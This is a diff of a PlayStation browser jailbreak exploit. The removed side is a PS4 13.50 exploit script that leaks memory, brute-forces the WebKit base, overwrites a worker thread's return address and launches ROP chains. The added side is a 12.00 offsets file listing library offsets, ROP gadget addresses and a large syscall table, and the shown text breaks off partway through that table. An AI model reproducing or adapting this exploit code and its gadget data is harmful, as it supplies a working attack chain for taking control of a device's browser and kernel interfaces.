@@ -1,541 +1,418 @@
-// PS4 13.50 WebKit Exploit — Modified from PS5 slopkit
-// Changes: vtable offset 0x10 (was 0x18), brute-force base finder,
-//          removed PS5 firmware check, added PS4 13.50 offsets placeholder
+// 12.00 -- generated from libSceNKWebKit / libkernel_web /
+// libSceLibcInternal. file offset = rva + 0x4000
 
-// ============================================================================
-// PS4 13.50 OFFSETS (placeholder — update after finding base)
-// ============================================================================
-// These are PS5 offsets as placeholders. Once you find the base, calculate
-// the real PS4 13.50 offsets and replace this section.
-const OFFSET_wk_host_constructor_candidates = [
-    0x34F98, 0x35808, 0x35900, 0x3A888, 0x3AAD0, 0x3BB18
-];
-const OFFSET_wk_vtable_first_element = 0x285170;  // WRONG for PS4 13.50!
+// host-constructor candidates: webkitBase = nativeCtorAddr - hc
+const OFFSET_wk_host_constructor_candidates = [0x0003A888, 0x0003AAD0, 0x0003BB18];
+// Exact WKDownloadGetTypeID export (NID -x5vK4NNNYM).
+const OFFSET_wk_vtable_first_element     = 0x002617E0;
+const OFFSET_wk_memset_import                  = 0x03510238;
+const OFFSET_wk___stack_chk_guard_import       = 0x0350DB88;
 
-// Import offsets from external file if available
-try {
-    if (typeof OFFSET_wk_memset_import === 'undefined') {
-        // Fallback minimal offsets — you MUST replace these with real PS4 13.50 values
-        window.OFFSET_wk_memset_import = 0x12345678;  // PLACEHOLDER
-        window.OFFSET_lc_memset = 0x12345678;         // PLACEHOLDER
-        window.OFFSET_wk___stack_chk_guard_import = 0x12345678;  // PLACEHOLDER
-        window.OFFSET_lk___stack_chk_guard = 0x12345678;         // PLACEHOLDER
-        window.OFFSET_lk__thread_list = 0x12345678;    // PLACEHOLDER
-        window.OFFSET_lk_worker_wait_return = 0x12345678;  // PLACEHOLDER
-        window.OFFSET_lc_setjmp = 0x12345678;          // PLACEHOLDER
-        window.OFFSET_lc_longjmp = 0x12345678;         // PLACEHOLDER
-        window.OFFSET_WORKER_STACK_OFFSET = 0x7F000;   // PLACEHOLDER
-        window.OFFSET_lk_pthread_create_name_np = 0x12345678;  // PLACEHOLDER
-        window.OFFSET_lk_pthread_join = 0x12345678;    // PLACEHOLDER
-        window.wk_gadgetmap = {};                      // PLACEHOLDER
-        window.syscall_map = {};                       // PLACEHOLDER
-    }
-} catch (e) {
-    console.log("Offsets not loaded, using placeholders");
-}
+const OFFSET_lk___stack_chk_guard              = 0x0006D1D0;
+const OFFSET_lk_pthread_create_name_np         = 0x00021800;
+const OFFSET_lk_pthread_join                   = 0x00022910;
+const OFFSET_lk_pthread_exit                   = 0x00021B90;
+// Exact retail exports used by the Stage-5 payload loader.
+const OFFSET_lk_scePthreadCreate               = 0x000079B0;
+const OFFSET_lk_scePthreadJoin                 = 0x0000B570;
+const OFFSET_lk_scePthreadAttrInit             = 0x000151E0;
+const OFFSET_lk_scePthreadAttrSetstacksize     = 0x0000C6B0;
+const OFFSET_lk_scePthreadAttrSetdetachstate   = 0x0000C0C0;
+const OFFSET_lk_scePthreadAttrDestroy          = 0x000104C0;
+const OFFSET_lk_sceKernelSendNotificationRequest = 0x000048B0;
+const OFFSET_lk_sysctlbyname                   = 0x00013BB0;
+const OFFSET_lk_pthread_create                 = 0x00021150;
+const OFFSET_lk_getpid                         = 0x0001B7D0;
+const OFFSET_lk__thread_list                   = 0x00064218;
+const OFFSET_lk_worker_wait_return             = 0x0001FC71;
+const OFFSET_lk_sleep                          = 0x00027E70;
+const OFFSET_lk_sceKernelGetCurrentCpu         = 0x00001200;
 
-// ============================================================================
-// 64-BIT UTILS (no bitwise JS on 64-bit numbers!)
-// ============================================================================
-function numToInt64(num) {
-    const low  = (num % 0x100000000) >>> 0;
-    const hi   = (Math.floor(num / 0x100000000)) >>> 0;
-    return new int64(low, hi);
-}
+const OFFSET_lc_memset                         = 0x00015BF0;
+const OFFSET_lc_malloc                         = 0x000060F0;
+const OFFSET_lc_free                           = 0x00006100;
+const OFFSET_lc_memcpy                         = 0x00003D80;
+const OFFSET_lc_strcmp                         = 0x000407C0;
+const OFFSET_lc_memcmp                         = 0x00078750;
+const OFFSET_lc_vsnprintf                      = 0x0005CF50;
+const OFFSET_lc_setjmp                         = 0x0005B850;
+const OFFSET_lc_longjmp                        = 0x0005B8A0;
 
-function align16k(addr) {
-    return addr.and64(0xFFFFC000, 0xFFFFFFFF);
-}
+// Fallback estimate only; main.js fingerprints the saved worker PC at runtime.
+const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB68;
 
-function int64ToNum(addr) {
-    return addr.hi * 0x100000000 + addr.low;
-}
-
-function isValidPtr(addr) {
-    const n = int64ToNum(addr);
-    return n >= 0x800000000 && n < 0x900000000;
-}
-
-function safeRead4(p, addr) {
-    try { return p.read4(addr); } catch (e) { return null; }
-}
-function safeRead8(p, addr) {
-    try { return p.read8(addr); } catch (e) { return null; }
-}
-
-// ============================================================================
-// BASE FINDER — Brute force from __ps5NativeCtor or vtable[0]
-// ============================================================================
-function findWebKitBase(p, ctorNum, vtable0) {
-    // Method 1: brute force from __ps5NativeCtor
-    if (typeof ctorNum === "number") {
-        const ctor = numToInt64(ctorNum);
-        log("BF: Ctor = 0x" + ctor.toString(16), LogLevel.INFO);
-
-        // Test PS5 offsets first
-        for (const off of OFFSET_wk_host_constructor_candidates) {
-            const base = align16k(ctor.sub32(off));
-            const magic = safeRead4(p, base);
-            if (magic !== null && (magic >>> 0) === 0x464c457f) {
-                log("✅ BASE via Ctor offset 0x" + off.toString(16) + " = 0x" + base.toString(16), LogLevel.SUCCESS);
-                return { base: base, method: "ctor", offset: off };
-            }
-        }
-
-        // Expanded brute force: 0x1000 to 0x10000000 in 0x1000 steps
-        log("BF: PS5 offsets failed, expanding search...", LogLevel.WARN);
-        for (let off = 0x1000; off <= 0x10000000; off += 0x1000) {
-            const base = align16k(ctor.sub32(off));
-            if (!isValidPtr(base)) continue;
-            const magic = safeRead4(p, base);
-            if (magic !== null && (magic >>> 0) === 0x464c457f) {
-                log("✅ BASE via Ctor brute force! offset=0x" + off.toString(16) + " base=0x" + base.toString(16), LogLevel.SUCCESS);
-                return { base: base, method: "ctor-brute", offset: off };
-            }
-            if (off % 0x100000 === 0) {
-                log("BF progress: 0x" + off.toString(16), LogLevel.INFO);
-            }
-        }
-    }
-
-    // Method 2: brute force from vtable[0]
-    if (vtable0 && isValidPtr(vtable0)) {
-        log("BF: Trying via vtable[0] = 0x" + vtable0.toString(16), LogLevel.INFO);
-        for (let off = 0x1000; off <= 0x4000000; off += 0x1000) {
-            const base = align16k(vtable0.sub32(off));
-            if (!isValidPtr(base)) continue;
-            const magic = safeRead4(p, base);
-            if (magic !== null && (magic >>> 0) === 0x464c457f) {
-                log("✅ BASE via vtable[0] brute force! offset=0x" + off.toString(16) + " base=0x" + base.toString(16), LogLevel.SUCCESS);
-                return { base: base, method: "vtable0-brute", offset: off };
-            }
-            if (off % 0x100000 === 0) {
-                log("BF progress: 0x" + off.toString(16), LogLevel.INFO);
-            }
-        }
-    }
-
-    return null;
-}
-
-// ============================================================================
-// ORIGINAL main.js CODE (modified for PS4 13.50)
-// ============================================================================
-
-const supportedFirmwares = ["13.50"];
-window.fw_str = "13.50";
-window.fw_float = 13.50;
-
-let nogc = [];
-
-function build_addr(p, buf, family, port, addr) {
-    p.write1(buf.add32(0x00), 0x10);
-    p.write1(buf.add32(0x01), family);
-    p.write2(buf.add32(0x02), port);
-    p.write4(buf.add32(0x04), addr);
-}
-
-function htons(port) {
-    return ((port & 0xFF) << 8) | (port >>> 8);
-}
-
-function find_worker(p, libKernelBase) {
-    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
-    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
-    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
-
-    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
-        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
-        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
-        if (stacksz.low == 0x80000) {
-            return stack;
-        }
-    }
-    throw new Error("failed to find worker.");
-}
-
-async function find_worker_return_slot(p, stack, libKernelBase) {
-    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
-    let lastCount = 0;
-
-    for (let attempt = 0; attempt < 50; attempt++) {
-        let hit = null;
-        let count = 0;
-        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
-            const candidate = stack.add32(offset);
-            const value = p.read8(candidate);
-            if (value.low !== expected.low || value.hi !== expected.hi)
-                continue;
-
-            hit = candidate;
-            count++;
-        }
-        if (count === 1) {
-            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
-                + "-expected=0x" + expected.toString());
-            return hit;
-        }
-        lastCount = count;
-        await new Promise(resolve => setTimeout(resolve, 1));
-    }
-    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
-}
-
-var LogLevel = {
-    DEBUG: 0,
-    INFO: 1,
-    LOG: 2,
-    WARN: 3,
-    ERROR: 4,
-    SUCCESS: 5,
-    FLAG_TEMP: 0x1000
+let wk_gadgetmap = {
+	"ret": 0x000000C7,
+	"pop rdi": 0x0005A469,
+	"pop rsi": 0x0016B03A,
+	"pop rdx": 0x00196067,
+	"pop rcx": 0x00006CFA,
+	"pop rax": 0x00006ECC,
+	"pop rsp": 0x00001872,
+	"pop r8": 0x0000716B,
+	"pop r9": 0x000FFFF6,
+	"mov [rdi], rsi": 0x00175CE7,
+	"mov [rdi], rax": 0x00086197,
+	"mov [rdi], eax": 0x000533DE,
+	"mov rax, [rax]": 0x0000D049,
+	"add rax, rcx": 0x000960F4,
+	"cmp [rcx], eax": 0x02C156CD,
+	"inc dword [rax]": 0x0000DF94,
+	"seta al": 0x00042C2C,
+	"setb al": 0x00039DAB,
+	"sete al": 0x00000117,
+	"setg al": 0x010AA046,
+	"setl al": 0x004103B0,
+	"shl rax, 3": 0x01D02503,
+	"shl rax, 4": 0x00D7CB42,
+	"shr rax, 3": 0x00D6F4F1,
+	"shr rax, 4": 0x01B7C8A3,
+	"infloop": 0x0002B1B1,
 };
 
-let consoleElem = null;
-let lastLogIsTemp = false;
-
-function log(string, level) {
-    if (consoleElem === null) {
-        consoleElem = document.getElementById("console");
-    }
-
-    const isTemp = level & LogLevel.FLAG_TEMP;
-    level = level & ~LogLevel.FLAG_TEMP;
-    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];
-
-    if (isTemp && lastLogIsTemp) {
-        const lastChild = consoleElem.lastChild;
-        lastChild.innerText = string;
-        lastChild.className = elemClass;
-        return;
-    } else if (isTemp) {
-        lastLogIsTemp = true;
-    } else {
-        lastLogIsTemp = false;
-    }
-
-    let logElem = document.createElement("div");
-    logElem.innerText = string;
-    logElem.className = elemClass;
-    consoleElem.appendChild(logElem);
-
-    consoleElem.scrollTop = consoleElem.scrollHeight;
-}
-
-const AF_INET = 2;
-const AF_INET6 = 28;
-const SOCK_STREAM = 1;
-const SOCK_DGRAM = 2;
-const IPPROTO_UDP = 17;
-const IPPROTO_IPV6 = 41;
-const IPV6_PKTINFO = 46;
-
-function jbmark(tag, detail) {
-    try {
-        if (window.jb && typeof window.jb.mark === "function")
-            window.jb.mark(tag, String(detail));
-    } catch (e) {  }
-}
-
-async function prepare(p) {
-
-    let textArea = document.createElement("textarea");
-
-    // PS4 13.50: vtable is at offset 0x10, NOT 0x18!
-    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x10));
-
-    let textAreaVtable = p.read8(textAreaVtPtr);
-
-    // Find base using brute force (PS4 13.50 offsets unknown)
-    let libSceNKWebKitBase = null;
-    let baseInfo = null;
-
-    if (typeof globalThis.__ps5NativeCtor === "number" || (textAreaVtable && isValidPtr(textAreaVtable))) {
-        baseInfo = findWebKitBase(p, globalThis.__ps5NativeCtor, textAreaVtable);
-        if (baseInfo) {
-            libSceNKWebKitBase = baseInfo.base;
-            jbmark("WEBKIT-BASE-FOUND", "method=" + baseInfo.method 
-                + "-offset=0x" + baseInfo.offset.toString(16)
-                + "-base=0x" + int64ToNum(libSceNKWebKitBase).toString(16));
-        }
-    }
-
-    // Fallback: try vtable first element offset (probably wrong for PS4)
-    if (libSceNKWebKitBase === null && textAreaVtable) {
-        try {
-            libSceNKWebKitBase = textAreaVtable.sub32(OFFSET_wk_vtable_first_element);
-            const magic = safeRead4(p, libSceNKWebKitBase);
-            if (magic === null || (magic >>> 0) !== 0x464c457f) {
-                libSceNKWebKitBase = null;
-                throw new Error("vtable first element offset gave invalid base");
-            }
-            jbmark("WEBKIT-BASE-VTABLE", "base=0x" + int64ToNum(libSceNKWebKitBase).toString(16));
-        } catch (e) {
-            log("VTable fallback failed: " + e.message, LogLevel.ERROR);
-        }
-    }
-
-    if (libSceNKWebKitBase === null) {
-        throw new Error("Could not find WebKit base! Ctor=0x" 
-            + (typeof globalThis.__ps5NativeCtor === "number" ? globalThis.__ps5NativeCtor.toString(16) : "N/A")
-            + " vtable=0x" + (textAreaVtable ? int64ToNum(textAreaVtable).toString(16) : "N/A"));
-    }
-
-    log("WebKit base: 0x" + int64ToNum(libSceNKWebKitBase).toString(16), LogLevel.SUCCESS);
-    if (baseInfo) {
-        log(">>> SAVE THIS OFFSET: " + baseInfo.method + " offset = 0x" + baseInfo.offset.toString(16) 
-            + " (" + baseInfo.offset + ")", LogLevel.SUCCESS);
-    }
-
-    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
-    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
-
-    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
-    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
-
-    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
-        + "-lk=0x" + libKernelBase.toString()
-        + "-lc=0x" + libSceLibcInternalBase.toString());
-
-    let gadgets = {};
-    let syscalls = {};
-
-    for (let gadget in wk_gadgetmap) {
-        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
-    }
-    for (let sysc in syscall_map) {
-        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
-    }
-
-    let nogc = [];
-
-    function malloc_dump(sz) {
-        let backing;
-        backing = new Uint8Array(sz);
-        nogc.push(backing);
-
-        let ptr = p.read8(p.leakval(backing).add32(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc(sz, type = 4) {
-        let backing;
-        if (type == 1) {
-            backing = new Uint8Array(1000 + sz);
-        } else if (type == 2) {
-            backing = new Uint16Array(0x2000 + sz);
-        } else if (type == 4) {
-            backing = new Uint32Array(0x10000 + sz);
-        }
-        nogc.push(backing);
-
-        let ptr = p.read8(p.leakval(backing).add32(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function array_from_address(addr, size) {
-        let og_array = new Uint8Array(1001);
-        let og_array_i = p.leakval(og_array).add32(0x10);
-
-        function setAddr(newAddr, size) {
-            p.write8(og_array_i, newAddr);
-            p.write4(og_array_i.add32(0x8), size);
-            p.write4(og_array_i.add32(0xC), 0x1);
-        }
-
-        setAddr(addr, size);
-
-        og_array.setAddr = setAddr;
-
-        nogc.push(og_array);
-        return og_array;
-    }
-
-    function stringify(str) {
-        let bufView = new Uint8Array(str.length + 1);
-        for (let i = 0; i < str.length; i++) {
-            bufView[i] = str.charCodeAt(i) & 0xFF;
-        }
-
-        let ptr = p.read8(p.leakval(bufView).add32(0x10));
-        ptr.backing = bufView;
-        return ptr;
-    }
-
-    function readstr(addr, maxlen = -1) {
-        let str = "";
-        for (let i = 0; ; i++) {
-            if (maxlen != -1 && i >= maxlen) { break; }
-            let c = p.read1(addr.add32(i));
-            if (c == 0x0) {
-                break;
-            }
-            str += String.fromCharCode(c);
-
-        }
-        return str;
-    }
-
-    function writestr(addr, str) {
-        let waddr = addr.add32(0);
-        if (typeof (str) == "string") {
-
-            for (let i = 0; i < str.length; i++) {
-                let byte = str.charCodeAt(i);
-                if (byte == 0) {
-                    break;
-                }
-                p.write1(waddr, byte);
-                waddr.add32inplace(0x1);
-            }
-        }
-        p.write1(waddr, 0x0);
-    }
-
-    async function wait_for_worker() {
-
-        return new Promise((resolve) => {
-            worker.onmessage = function (e) {
-                resolve(1);
-            }
-            worker.postMessage(0);
-        });
-
-    }
-
-    let worker = new Worker("rop_slave.js");
-
-    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
-    await wait_for_worker();
-    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");
-
-    let worker_stack = find_worker(p, libKernelBase);
-    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
-        + "-next=malloc(0x40)+worker_rop(0xC0000)");
-    let original_context = malloc(0x40);
-
-    let return_address_ptr;
-    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
-        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
-    } else {
-        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
-    }
-    let original_return_address = p.read8(return_address_ptr);
-    let stack_pointer_ptr = return_address_ptr.add32(0x8);
-
-    function pre_chain(chain) {
-
-        chain.push(gadgets["pop rdi"]);
-        chain.push(original_context);
-        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
-    }
-
-    async function launch_chain(chain) {
-
-        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
-        chain.push_write8(original_context, original_return_address);
-        chain.push_write8(original_context.add32(0x10), return_address_ptr);
-        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
-        chain.push(gadgets["pop rdi"]);
-        chain.push(original_context);
-        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));
-
-        if (window.jb && window.jb.hot)
-            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
-                + "-poprsp=0x" + gadgets["pop rsp"].toString()
-                + "-rsp=0x" + chain.stack_entry_point.toString());
-
-        p.write8(return_address_ptr, gadgets["pop rsp"]);
-        p.write8(stack_pointer_ptr, chain.stack_entry_point);
-
-        if (window.jb && window.jb.hot)
-            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
-        let p1 = await new Promise((resolve) => {
-            worker.onmessage = function (e) {
-                resolve(1);
-            }
-            worker.postMessage(0);
-        });
-        if (window.jb && window.jb.hot)
-            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
-        if (p1 == 0) {
-            throw new Error("The rop thread ran away. ");
-        }
-    }
-
-    let p2 = {
-        write8: p.write8,
-        write4: p.write4,
-        write2: p.write2,
-        write1: p.write1,
-        read8: p.read8,
-        read4: p.read4,
-        read2: p.read2,
-        read1: p.read1,
-        leakval: p.leakval,
-        pre_chain: pre_chain,
-        launch_chain: launch_chain,
-        malloc_dump: malloc_dump,
-        malloc: malloc,
-        stringify: stringify,
-        array_from_address: array_from_address,
-        readstr: readstr,
-        writestr: writestr,
-        libSceNKWebKitBase: libSceNKWebKitBase,
-        libSceLibcInternalBase: libSceLibcInternalBase,
-        libKernelBase: libKernelBase,
-        nogc: nogc,
-        syscalls: syscalls,
-        gadgets: gadgets
-    };
-
-    let chain = new worker_rop(p2);
-
-    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
-    p.write8(chain.return_value, JB_POISON);
-    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
-        + "-poisoned-next=chain.syscall(SYS_GETPID)");
-
-    let pid = await chain.syscall(SYS_GETPID);
-
-    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
-    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
-        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
-        throw new Error("The ROP chain never executed: the return slot still "
-            + "holds the poison. The hijacked thread is not the one postMessage "
-            + "wakes (main.js:69's worker vs this one), or the stack write did "
-            + "not land.");
-    }
-
-    if (pid.low == 0) {
-        throw new Error("Webkit exploit failed.");
-    }
-    jbmark("PREP-GETPID-OK", "pid=" + pid.low);
-
-    return { p: p2, chain: chain };
-}
-
-async function main(userlandRW, wkOnly = false) {
-    const debug = false;
-
-    const { p, chain } = await prepare(userlandRW);
-    if (debug) await log("Chain initialized", LogLevel.DEBUG);
-
-    // ... rest of main() unchanged ...
-    // (payload loading, elfldr, etc. — same as original)
-
-    log("PS4 13.50 exploit reached main()! Base found, chain ready.", LogLevel.SUCCESS);
-
-    // For now, just show success. The full payload loading code would go here.
-    // Copy the rest of the original main() function below this point.
-}
-
-// Load offsets if available
-let fwScript = document.createElement('script');
-document.body.appendChild(fwScript);
-fwScript.setAttribute('src', `../offsets/13.50.js?v=1`);
-fwScript.onerror = function() {
-    log("offsets/13.50.js not found, using embedded placeholders", LogLevel.WARN);
+let syscall_map = {
+	0x001: 0x0001BA8A,
+	0x002: 0x0001D490,
+	0x003: 0x0001B650,
+	0x004: 0x0001B5B0,
+	0x005: 0x0001BC50,
+	0x006: 0x0001C280,
+	0x007: 0x0001AE50,
+	0x00A: 0x0001CFD0,
+	0x00C: 0x0001C940,
+	0x00F: 0x0001C300,
+	0x014: 0x0001B7D0,
+	0x017: 0x0001B2B0,
+	0x018: 0x0001C920,
+	0x019: 0x0001BC90,
+	0x01B: 0x0001BD30,
+	0x01C: 0x0001BF60,
+	0x01D: 0x0001CAF0,
+	0x01E: 0x0001B1B0,
+	0x01F: 0x0001AFD0,
+	0x020: 0x0001D170,
+	0x021: 0x0001CC90,
+	0x022: 0x0001CE10,
+	0x023: 0x0001C7C0,
+	0x024: 0x0001D6C0,
+	0x025: 0x0001BC30,
+	0x027: 0x0001B6D0,
+	0x029: 0x0001CCF0,
+	0x02A: 0x0001B620,
+	0x02B: 0x0001D330,
+	0x02C: 0x0001D680,
+	0x02F: 0x0001B150,
+	0x031: 0x0001B130,
+	0x032: 0x0001CA20,
+	0x035: 0x0001B370,
+	0x036: 0x0001B4F0,
+	0x037: 0x0001C800,
+	0x038: 0x0001C700,
+	0x03B: 0x0001BF1D,
+	0x041: 0x0001C360,
+	0x049: 0x0001BB50,
+	0x04A: 0x0001C900,
+	0x04B: 0x0001BA40,
+	0x04E: 0x0001BC10,
+	0x04F: 0x0001B0B0,
+	0x050: 0x0001B670,
+	0x053: 0x0001B090,
+	0x056: 0x0001AEB0,
+	0x059: 0x0001C760,
+	0x05A: 0x0001CB70,
+	0x05C: 0x0001C160,
+	0x05D: 0x0001BCB0,
+	0x05F: 0x0001B0F0,
+	0x060: 0x0001C040,
+	0x061: 0x0001B890,
+	0x062: 0x0001C960,
+	0x063: 0x0001D2F0,
+	0x064: 0x0001AE70,
+	0x065: 0x0001CF10,
+	0x066: 0x0001D290,
+	0x068: 0x0001CF90,
+	0x069: 0x0001C1A0,
+	0x06A: 0x0001B490,
+	0x071: 0x0001C4C0,
+	0x072: 0x0001BE70,
+	0x074: 0x0001D6A0,
+	0x075: 0x0001D780,
+	0x076: 0x0001AE30,
+	0x078: 0x0001C0E0,
+	0x079: 0x0001BF40,
+	0x07A: 0x0001CBD0,
+	0x07C: 0x0001BAD0,
+	0x07D: 0x0001C340,
+	0x07E: 0x0001D270,
+	0x07F: 0x0001BE30,
+	0x080: 0x0001CDF0,
+	0x083: 0x0001BDB0,
+	0x085: 0x0001D6E0,
+	0x086: 0x0001D510,
+	0x087: 0x0001C880,
+	0x088: 0x0001C600,
+	0x089: 0x0001B830,
+	0x08A: 0x0001AD20,
+	0x08C: 0x0001D230,
+	0x08D: 0x0001C320,
+	0x093: 0x0001C5A0,
+	0x0A5: 0x0001B050,
+	0x0B6: 0x0001D070,
+	0x0B7: 0x0001AE90,
+	0x0BC: 0x0001D0D0,
+	0x0BD: 0x0001D4D0,
+	0x0BE: 0x0001BE50,
+	0x0BF: 0x0001B550,
+	0x0C0: 0x0001C840,
+	0x0C2: 0x0001BD90,
+	0x0C3: 0x0001B970,
+	0x0C4: 0x0001CFF0,
+	0x0CA: 0x0001CDD0,
+	0x0CB: 0x0001C420,
+	0x0CC: 0x0001CE70,
+	0x0CE: 0x0001B8D0,
+	0x0D1: 0x0001BEB0,
+	0x0E8: 0x0001AF50,
+	0x0E9: 0x0001C3E0,
+	0x0EA: 0x0001D440,
+	0x0EB: 0x0001D010,
+	0x0EC: 0x0001B730,
+	0x0ED: 0x0001D4F0,
+	0x0EE: 0x0001C980,
+	0x0EF: 0x0001BAF0,
+	0x0F0: 0x0001CED0,
+	0x0F1: 0x0001C6E0,
+	0x0F2: 0x0001B690,
+	0x0F3: 0x0001C540,
+	0x0F7: 0x0001CF70,
+	0x0FB: 0x0001BA69,
+	0x0FD: 0x0001CB10,
+	0x110: 0x0001D2D0,
+	0x121: 0x0001C9C0,
+	0x122: 0x0001BED0,
+	0x136: 0x0001BBD0,
+	0x13B: 0x0001D0F0,
+	0x144: 0x0001B750,
+	0x145: 0x0001CB90,
+	0x147: 0x0001B850,
+	0x148: 0x0001C4E0,
+	0x149: 0x0001AFF0,
+	0x14A: 0x0001BE90,
+	0x14B: 0x0001BCF0,
+	0x14C: 0x0001B270,
+	0x14D: 0x0001B390,
+	0x14E: 0x0001B5E0,
+	0x154: 0x0001AD80,
+	0x155: 0x0001ADC0,
+	0x157: 0x0001CD10,
+	0x159: 0x0001CE30,
+	0x15A: 0x0001CA50,
+	0x16A: 0x0001D050,
+	0x16B: 0x0001B230,
+	0x17B: 0x0001B1D0,
+	0x188: 0x0001B2F0,
+	0x189: 0x0001D7C0,
+	0x18D: 0x0001B7B0,
+	0x190: 0x0001B350,
+	0x191: 0x0001C100,
+	0x192: 0x0001C9E0,
+	0x193: 0x0001D7A0,
+	0x194: 0x0001B4B0,
+	0x195: 0x0001CF30,
+	0x196: 0x0001CBF0,
+	0x197: 0x0001B310,
+	0x198: 0x0001CBB0,
+	0x1A0: 0x0001D0B0,
+	0x1A1: 0x0001CD50,
+	0x1A5: 0x0001B9D4,
+	0x1A6: 0x0001C740,
+	0x1A7: 0x0001C860,
+	0x1AD: 0x0001BA20,
+	0x1AE: 0x0001B0D0,
+	0x1AF: 0x0001B450,
+	0x1B0: 0x0001BDF0,
+	0x1B1: 0x0001B470,
+	0x1B9: 0x0001CAD0,
+	0x1BA: 0x0001ADA0,
+	0x1BB: 0x0001B6F0,
+	0x1BC: 0x0001C7A0,
+	0x1C6: 0x0001AE20,
+	0x1C7: 0x0001D1F0,
+	0x1C8: 0x0001D150,
+	0x1D0: 0x0001CA90,
+	0x1D2: 0x0001C000,
+	0x1DB: 0x0001B790,
+	0x1DC: 0x0001C8E0,
+	0x1DD: 0x0001D1D0,
+	0x1DE: 0x0001CCD0,
+	0x1DF: 0x0001BD10,
+	0x1E0: 0x0001B770,
+	0x1E1: 0x0001AD40,
+	0x1E2: 0x0001D740,
+	0x1E3: 0x0001D1B0,
+	0x1E6: 0x0001B990,
+	0x1E7: 0x0001D5B0,
+	0x1E8: 0x0001CD70,
+	0x1F3: 0x0001B110,
+	0x203: 0x0001C820,
+	0x20A: 0x0001C220,
+	0x214: 0x0001C2E0,
+	0x215: 0x0001C060,
+	0x216: 0x0001C660,
+	0x217: 0x0001B530,
+	0x218: 0x0001C380,
+	0x21A: 0x0001C2C0,
+	0x21B: 0x0001B710,
+	0x21C: 0x0001C680,
+	0x21D: 0x0001C240,
+	0x21E: 0x0001C520,
+	0x21F: 0x0001CD30,
+	0x220: 0x0001C6A0,
+	0x221: 0x0001CC50,
+	0x222: 0x0001BA00,
+	0x223: 0x0001C500,
+	0x224: 0x0001BDD0,
+	0x225: 0x0001BFE0,
+	0x226: 0x0001AF90,
+	0x227: 0x0001AF10,
+	0x228: 0x0001D590,
+	0x229: 0x0001C5E0,
+	0x22A: 0x0001CC10,
+	0x22B: 0x0001C8A0,
+	0x22C: 0x0001C140,
+	0x22D: 0x0001BEF0,
+	0x22E: 0x0001BBF0,
+	0x22F: 0x0001D820,
+	0x230: 0x0001B6B0,
+	0x233: 0x0001C020,
+	0x234: 0x0001B070,
+	0x235: 0x0001C0A0,
+	0x236: 0x0001C0C0,
+	0x237: 0x0001CB50,
+	0x23C: 0x0001B930,
+	0x249: 0x0001CFB0,
+	0x24A: 0x0001BB10,
+	0x24B: 0x0001C3C0,
+	0x24C: 0x0001AEF0,
+	0x24F: 0x0001B510,
+	0x250: 0x0001B810,
+	0x251: 0x0001D310,
+	0x252: 0x0001C1C0,
+	0x253: 0x0001B190,
+	0x254: 0x0001D090,
+	0x255: 0x0001C460,
+	0x256: 0x0001BFC0,
+	0x257: 0x0001D370,
+	0x258: 0x0001AD60,
+	0x259: 0x0001B8F0,
+	0x25A: 0x0001BF80,
+	0x25B: 0x0001CE50,
+	0x25C: 0x0001B3D0,
+	0x25D: 0x0001BB30,
+	0x25E: 0x0001B2D0,
+	0x25F: 0x0001C480,
+	0x260: 0x0001D760,
+	0x262: 0x0001D800,
+	0x263: 0x0001B600,
+	0x264: 0x0001D570,
+	0x265: 0x0001AD00,
+	0x267: 0x0001C080,
+	0x268: 0x0001D190,
+	0x269: 0x0001C780,
+	0x26A: 0x0001C440,
+	0x26B: 0x0001B210,
+	0x26C: 0x0001B330,
+	0x26E: 0x0001AF30,
+	0x26F: 0x0001C3A0,
+	0x270: 0x0001D7E0,
+	0x271: 0x0001CD90,
+	0x272: 0x0001B870,
+	0x273: 0x0001AED0,
+	0x274: 0x0001C580,
+	0x275: 0x0001B910,
+	0x276: 0x0001C120,
